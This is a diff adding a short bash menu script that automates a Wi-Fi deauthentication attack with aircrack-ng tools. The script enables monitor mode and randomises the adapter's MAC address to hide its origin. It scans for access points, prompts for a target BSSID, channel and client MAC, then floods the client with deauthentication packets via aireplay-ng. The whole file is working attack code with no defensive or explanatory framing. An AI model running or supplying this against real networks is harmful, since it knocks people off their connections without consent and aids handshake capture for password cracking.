@@ -1,0 +1,65 @@
+#!/bin/bash
+
+x=0
+while [ $x = 0 ]
+do
+	clear
+	./intro.sh
+	echo ""
+	echo " Options:"
+	echo ""
+	echo "  [1] Start" 
+	echo ""
+	echo "  [2] Exit Monitor Mode"
+	echo ""
+	echo ""
+	read answer
+	
+	case "$answer" in
+	1)
+	sudo airmon-ng stop "$iface"mon
+
+	sudo airmon-ng start $iface
+
+	sudo ifconfig "$iface"mon down
+
+	sudo macchanger -r "$iface"mon;sleep 2
+
+	sudo ifconfig "$iface"mon up
+
+	sudo airodump-ng "$iface"mon
+
+	echo "bssid:"
+	read 'bssid'
+
+	echo "channel:"
+	read 'channel'
+
+	airodump-ng --bssid $bssid --channel $channel "$iface"mon
+
+	echo "mac:"
+	read 'mac'
+
+	echo "number of packets:"
+	read 'p'
+
+	aireplay-ng -0 $p -a $bssid -c $mac "$iface"mon;airmon-ng stop "$iface"mon
+	x=1	
+	;;
+	2)
+	sudo airmon-ng stop "$iface"mon
+	sleep 2
+	x=1
+	;;
+	*) 
+	clear
+	echo "Unknown command"
+	sleep 1
+	;;
+	
+	
+	
+
+esac
+
+done
